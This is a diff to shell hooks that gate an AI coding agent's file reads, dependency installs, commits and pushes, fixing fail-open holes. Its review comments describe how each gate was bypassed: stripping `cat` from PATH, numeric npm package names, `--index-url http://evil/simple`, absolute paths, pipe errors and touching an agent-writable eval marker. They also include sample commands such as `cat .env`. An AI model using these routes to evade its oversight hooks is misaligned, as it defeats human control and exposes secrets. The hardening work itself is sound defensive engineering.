@@ -298,7 +298,27 @@ hook_fail(){
 }
 trap 'hook_fail "unexpected hook error at line $LINENO"' ERR
 
-INPUT="$(cat || true)"
+# [round-2 review F-301] Was `INPUT="$(cat || true)"`. The batch that closed
+# the PATH-manipulation fail-open rewrote three helpers in pure bash and left
+# the payload read itself forking `cat` - in the SHARED header, so ONE
+# missing binary disabled all eleven hooks at once, in the direction that
+# allows. Confirmed by execution: with a PATH holding jq, python3, grep, sed,
+# tr and git but not `cat`, secrets-gate on `cat .env` and dependency-gate on
+# `npm install evil` both returned rc=0. INPUT was empty, jq succeeds on
+# empty input so hook_fail never fired, every jget returned empty and every
+# gate fell through to allow - with no error line, no log entry and no
+# hook_fail. A strictly better lever than the `tr`/`grep` that batch removed.
+#
+# `read -r -d ''` is a BUILTIN: it reads to NUL (which JSON cannot contain,
+# so it reads to EOF), preserves newlines, and returns non-zero at EOF -
+# hence the `|| true`, which is about EOF, not about tolerating failure.
+IFS= read -r -d '' INPUT || true
+# A payload that is empty when the harness always sends one means the read
+# itself failed, which is the shape every fail-open in this class has taken.
+# Fail CLOSED and say so, rather than letting the gates evaluate nothing.
+if [ -z "$INPUT" ]; then
+  hook_fail "empty hook payload on stdin (expected a JSON tool event)"
+fi
 have_jq(){ command -v jq >/dev/null 2>&1; }
 have_py(){ command -v python3 >/dev/null 2>&1; }
 # Kept in a variable and passed with `python3 -c` so the program does not
@@ -837,11 +857,25 @@ exit 0
 # one thing is decided differently for each: whether a bare directory NAME
 # counts as naming the directory. See the $_dir_ok discussion below.
 CANDIDATES=()
+PAT_CANDIDATES=()
 CMD_CANDIDATES=()
-for _k in file_path notebook_path path pattern; do
+for _k in file_path notebook_path path; do
   _v="$(jget ".tool_input.$_k")"
   [ -n "$_v" ] && CANDIDATES+=("$_v")
 done
+# [round-2 review F-788] `pattern` is a SEARCH REGEX, not a path, and it used
+# to sit in the list above where a bare directory NAME counts as naming the
+# directory. So `Grep{{pattern:"secrets"}}` exited 2 - searching your own
+# codebase for the word "secrets" was impossible on a default install, in
+# the gate whose own comment says it has no override path. The v2.6.2 note
+# claims this failure mode was retired; it turned the arm off for the `cmd`
+# phase and left `pattern` in the `path` phase, where it still applied.
+# It still has to be MATCHED - `Grep{{pattern:"*.pem"}}` returns the contents
+# of matching files - so it gets its own phase with _dir_ok=0 rather than
+# being dropped. Any directory pattern generalizes the bug it fixes
+# (`config/**` blocked `Grep pattern="config"`).
+_v="$(jget '.tool_input.pattern')"
+[ -n "$_v" ] && PAT_CANDIDATES+=("$_v")
 
 # --- Bash surface: a QUOTE-AWARE tokenizer ---------------------------------
 # The v2.6.0 version was `read -ra _toks <<< "$_cmd"` plus a one-deep quote
@@ -1020,7 +1054,8 @@ if [ -n "$_cmd" ]; then
   # the shell itself does.
   _sg_scan "$_cmd"
 fi
-if [ "${{#CANDIDATES[@]}}" -eq 0 ] && [ "${{#CMD_CANDIDATES[@]}}" -eq 0 ]; then
+if [ "${{#CANDIDATES[@]}}" -eq 0 ] && [ "${{#PAT_CANDIDATES[@]}}" -eq 0 ] \
+   && [ "${{#CMD_CANDIDATES[@]}}" -eq 0 ]; then
   log "secrets-gate: no path"; exit 0
 fi
 # Case-insensitive matching ('.PEM'/'.ENV' are just as sensitive) done with
@@ -1055,9 +1090,13 @@ PAT_EOF
 # and `secrets/anything` still blocks there by the ordinary anchored rule.
 # The residue - `tar cf /tmp/s.tar secrets` - is recorded as J-14 rather
 # than paid for with a false positive on ordinary prose.
-for _phase in path cmd; do
+for _phase in path pattern cmd; do
 if [ "$_phase" = "path" ]; then
   _LIST=(${{CANDIDATES[@]+"${{CANDIDATES[@]}}"}}); _dir_ok=1
+elif [ "$_phase" = "pattern" ]; then
+  # [F-788] A search regex is not a path: matched, but a bare directory
+  # stem in it does not name the directory.
+  _LIST=(${{PAT_CANDIDATES[@]+"${{PAT_CANDIDATES[@]}}"}}); _dir_ok=0
 else
   _LIST=(${{CMD_CANDIDATES[@]+"${{CMD_CANDIDATES[@]}}"}}); _dir_ok=0
 fi
@@ -1090,10 +1129,20 @@ for TARGET in ${{_LIST[@]+"${{_LIST[@]}}"}}; do
   # `.env.production` are untouched. This is the only place this gate allows
   # something a previous version blocked; it is asserted as an explicit
   # exemption in tests/test_hook_behavior.py rather than left implicit.
+  # [round-2 review F-947] This used to `continue` the TARGET loop, which
+  # skipped EVERY never-read pattern, not just the dotenv family it is
+  # scoped to - so `secrets/.env.example`, `secrets/env.template` and
+  # `secrets/.ENV.EXAMPLE` were all unguarded, and `secrets/**` is precisely
+  # the pattern the exemption must not override. The comment said "exact
+  # basenames only ... so .env.example.real and .env.production are
+  # untouched", which is true of the BASENAME test and says nothing about
+  # the control-flow scope, which was the whole pattern list.
+  # Recorded as a flag here and applied inside the pattern loop, where the
+  # pattern's form is known.
+  _dotenv_tmpl=0
   case "$base" in
     .env.example|.env.sample|.env.template|.env.dist|.env.defaults\\
-    |env.example|env.sample|env.template)
-      log "secrets-gate allow dotenv template $TARGET"; continue ;;
+    |env.example|env.sample|env.template) _dotenv_tmpl=1 ;;
   esac
   for pat in ${{PATS[@]+"${{PATS[@]}}"}}; do
     [ -z "$pat" ] && continue
@@ -1111,6 +1160,14 @@ for TARGET in ${{_LIST[@]+"${{_LIST[@]}}"}}; do
       .*)  form=dotfile ;;       # '.env*': the dotenv family
       *)   form=anchored ;;      # 'secrets/*': path-segment anchored
     esac
+    # [F-947] The dotenv-template exemption applies to the DOTFILE family
+    # only - the patterns it exists to soften. A template that also lives
+    # under a never-read DIRECTORY is still a secret by location, and
+    # `secrets/**` decides that, not its basename.
+    if [ "$_dotenv_tmpl" = "1" ] && [ "$form" = "dotfile" ]; then
+      log "secrets-gate allow dotenv template $TARGET"
+      continue
+    fi
     # The dotfile family needs BOTH corrections at once, and they pull in
     # opposite directions. T-1 established that realistic dotenv names which
     # do not START with the pattern - config.env, prod.env, staging.env - must
@@ -1464,8 +1521,19 @@ is_flag_value(){{
     # the `key=value` arm, because `==` `>=` `<=` `~=` `!=` all contain `=`.
     *==*|*'>='*|*'<='*|*'~='*|*'!='*|*'<'*|*'>'*) return 1 ;;
     *=*) return 0 ;;
-    *[!0-9.]*) return 1 ;;          # not a bare version number
-    *) return 0 ;;
+    *[!0-9.]*) return 1 ;;          # not digits-and-dots at all
+    # [round-2 review F-1313] A bare version must LOOK like one. `^[0-9.]+$`
+    # alone still swallowed SINGLE-CHARACTER numeric names, and `0`, `1` and
+    # `2` are all real npm registry packages: `npm install -f 0`,
+    # `npm install -p 1` and `npm i -w 2` each installed unapproved. That is
+    # the identical class as the `7zip-bin`/`0x`/`2to3` hole the previous
+    # round fixed, narrowed by one character - the third consecutive round
+    # this predicate has shipped a hole. Requiring a DOT separates a version
+    # from a numeric package name; the cost is that a dotless flag value
+    # (`--python-version 3`) is now read as a package and named in the
+    # refusal, which is the over-match direction a deny-list wants.
+    *.*) return 0 ;;                # digits AND a dot: a version
+    *) return 1 ;;                  # bare `0`, `1`, `2`: a package name
   esac
 }}
 while IFS= read -r nseg; do
@@ -1501,15 +1569,35 @@ while IFS= read -r nseg; do
         echo "Dependency gate: cannot verify packages listed in a file." >&2
         echo "Install them explicitly, or approve in .claude/steering/deps.md." >&2
         exit 2 ;;
-      -i|--index-url|--extra-index-url|--find-links|--no-binary|--only-binary\\
+      # [round-2 review F-1357] A package-index override on the COMMAND LINE
+      # is the same attack as the environment-variable spelling that
+      # $_IDX_RE already refuses above, and it was being SKIPPED as an
+      # ordinary flag value - so `pip install --index-url http://evil/simple
+      # requests` was allowed while `PIP_INDEX_URL=http://evil/simple pip
+      # install requests` was blocked, with the same reason string sitting
+      # in the same file. `cargo add --git <url>` is the extreme case: an
+      # arbitrary source with no package name in the command at all.
+      # Denied for the same reason the env form is: the flag redirects even
+      # an APPROVED package to a server this gate cannot verify, so
+      # consuming its value and then checking the package name proves
+      # nothing. `-f` is deliberately NOT here - it is pip's --find-links
+      # but npm's --force, and blaming the wrong one gives worse advice
+      # than treating it as an ordinary value flag.
+      -i|--index-url|--extra-index-url|--find-links|--registry|--index\\
+      |--git|--repo)
+        echo "Dependency gate: a package-index override is not verifiable." >&2
+        echo "It redirects even an APPROVED package to another server. Remove it," >&2
+        echo "or set the index in the project's own package-manager config." >&2
+        exit 2 ;;
+      --no-binary|--only-binary\\
       |--platform|--python-version|--implementation|--abi|--progress-bar\\
       |--cache-dir|--log|--proxy|--cert|--client-cert|--trusted-host\\
       |--config-settings|--report|--timeout|--retries|--exists-action\\
       |--upgrade-strategy|--src|-e|--editable|-t|--target|--prefix|--root\\
-      |-d|--dest|--registry|--userconfig|--globalconfig|--cache|--workspace\\
+      |-d|--dest|--userconfig|--globalconfig|--cache|--workspace\\
       |-w|--omit|--include|--install-strategy|--before|--tag|--scope\\
       |--access|--store-dir|--virtual-store-dir|--modules-folder|--reporter\\
-      |--filter|--dir|-C|--manifest-path|--features|--index|--git|--branch\\
+      |--filter|--dir|-C|--manifest-path|--features|--branch\\
       |--rev|--path|-p|--package|--profile|--bin|--example|--vers|-f)
         skip_next=1; continue ;;
       -*) continue ;;
@@ -1536,6 +1624,22 @@ exit 0
         return _HOOK_HEADER + '''
 # PreToolUse Write to source: block unless a matching test was edited newer.
 TARGET="$(jget '.tool_input.file_path')"
+# [round-2 review F-1393] Claude Code passes ABSOLUTE file paths, and the
+# `case` below is anchored on `src/`/`lib/`, so on the payload shape the
+# harness actually sends this gate matched NOTHING and silently allowed
+# every write - while the SDK twin normalized and denied. The SDK's own
+# comment names the bug verbatim ("a bare re.match on an absolute path
+# never matches, silently disabling the gate") and fixed only its own side.
+# The differential could not see it either: its tdd corpus used relative
+# paths exclusively, so the flagship parity test certified an agreement
+# that did not exist in production.
+# Strip the project root, then any leading `./`, so both shapes reach the
+# same matcher. Shell parity (the SDK's _rel_to_proj).
+_PROJ_ABS="${CLAUDE_PROJECT_DIR:-.}"
+case "$TARGET" in
+  "$_PROJ_ABS"/*) TARGET="${TARGET#"$_PROJ_ABS"/}" ;;
+esac
+TARGET="${TARGET#./}"
 case "$TARGET" in
   src/*|lib/*)
     base="$(basename "$TARGET")"; stem="${base%.*}"
@@ -1564,7 +1668,49 @@ exit 0
 CMD="$(jget '.tool_input.command')"
 NCMD="$(norm_cmd "$CMD")"
 if git_verb "$NCMD" "push"; then
-    if git diff --name-only HEAD~1 2>/dev/null | grep -qE 'prompt|\\.md$'; then
+    # [round-2 review F-1420] This was
+    #   `if git diff --name-only HEAD~1 | grep -qE 'prompt|\\.md$'`
+    # and it failed OPEN two ways at once, both in an `if` condition, which
+    # is exempt from `set -e` and therefore from the ERR trap:
+    #   (a) `grep` off PATH -> 127 -> the else branch -> "no prompt files
+    #       changed" -> push allowed. The same external-binary class this
+    #       suite removed from three shared helpers [lens A F5], left in
+    #       place here because the surrounding `case` was rewritten into an
+    #       `if` without anyone looking inside the pipeline.
+    #   (b) `grep -q` exits at the first match and SIGPIPEs git. Under the
+    #       header's `set -o pipefail` the pipeline then returns 141, the
+    #       else branch runs, and a push whose diff exceeds the pipe buffer
+    #       (~64 KiB, i.e. a squash or merge touching >~1300 paths) bypasses
+    #       the gate entirely.
+    # Pure bash, no pipeline, and the git failure is now a DECISION rather
+    # than a silent falsethrough: spec-gate-commit's grep already fails
+    # closed, so the direction here was a choice, not a constraint.
+    _diff_rc=0
+    _CHANGED=""
+    if git rev-parse --verify -q HEAD~1 >/dev/null 2>&1; then
+      _CHANGED="$(git diff --name-only HEAD~1 2>/dev/null)" || _diff_rc=$?
+    elif git rev-parse --verify -q HEAD >/dev/null 2>&1; then
+      # A ROOT commit has no HEAD~1 to diff against, and the old pipeline
+      # simply reported "no prompt files changed" for it - so the very first
+      # push of a repo, the one that introduces every prompt file it has,
+      # was the one push this gate never inspected. Everything in the tree
+      # is new at that point.
+      _CHANGED="$(git ls-tree -r --name-only HEAD 2>/dev/null)" || _diff_rc=$?
+    fi
+    # No HEAD at all means there is nothing to push; _CHANGED stays empty
+    # and the gate allows. Any OTHER git failure is a refusal, not a shrug.
+    if [ "$_diff_rc" -ne 0 ]; then
+      echo "Eval gate: cannot read what this push contains (git exit \\
+$_diff_rc); refusing to guess." >&2
+      exit 2
+    fi
+    _prompt_touched=0
+    while IFS= read -r _f; do
+      case "$_f" in
+        *prompt*|*.md) _prompt_touched=1; break ;;
+      esac
+    done <<< "$_CHANGED"
+    if [ "$_prompt_touched" = "1" ]; then
       # [lens A F4, same class as test-gate] `.last-eval-pass` is gitignored
       # and agent-writable, and `touch`ing it satisfies this gate. Unlike
       # test-gate there is no configured eval command to run instead, so the
@@ -3066,8 +3212,16 @@ def _hook_body_retrofit(name: str, cfg: dict):
         checks = r'''
 HOOK_NAME=spec-gate-commit
 CMD="$(jget '.tool_input.command')"
-case "$CMD" in
-  *"git commit"*)
+# [round-2 review F-2923] This gated the warn-only exemptions on a raw
+# SUBSTRING while the greenfield body it wraps is anchored to command
+# position - so the two disagreed in BOTH directions during the weeks the
+# rollout schedule promises are warn-only. `git  commit -m x` (two spaces)
+# and `git -C . commit -m x` skipped the exemption and hit the ENFORCING
+# body, blocking a commit in week 1 whose own table says week 1 blocks
+# nothing; and `echo "git commit"` fired the warn-only message on a command
+# the body ignores entirely. Uses the same anchor as the body it guards, so
+# preamble and body can no longer disagree about what a commit is.
+if git_verb "$(norm_cmd "$CMD")" "commit"; then
     _staged="$(git diff --cached --name-only 2>/dev/null || true)"
     # Affirmative exemption 1: retrofit_active AND all staged files under .claude/.
     # This permits .claude/-only commits while the retrofit itself is in flight
@@ -3107,16 +3261,17 @@ case "$CMD" in
 would have blocked; see rollout-schedule.md" >&2
       exit 0
     fi
-    ;;
-esac
+fi
 # Fall through to greenfield body (ENFORCE; T2).
 '''
     elif name == "test-gate":
         checks = r'''
 HOOK_NAME=test-gate
 CMD="$(jget '.tool_input.command')"
-case "$CMD" in
-  *"git commit"*)
+# [round-2 review F-2923] Same substring-vs-anchor mismatch as
+# spec-gate-commit above; see that comment. `git  commit -m x` reported
+# "Commit blocked: tests failing" in a week whose table says nothing blocks.
+if git_verb "$(norm_cmd "$CMD")" "commit"; then
     # Affirmative exemption: rollout-week says don't block yet
     # (weeks 1-2 default = warn-only for test-gate).
     if ! retrofit_should_block test-gate; then
@@ -3125,8 +3280,7 @@ case "$CMD" in
 have run/blocked; see rollout-schedule.md" >&2
       exit 0
     fi
-    ;;
-esac
+fi
 # Fall through to greenfield body (ENFORCE; T2).
 '''
     elif name == "tdd-gate":
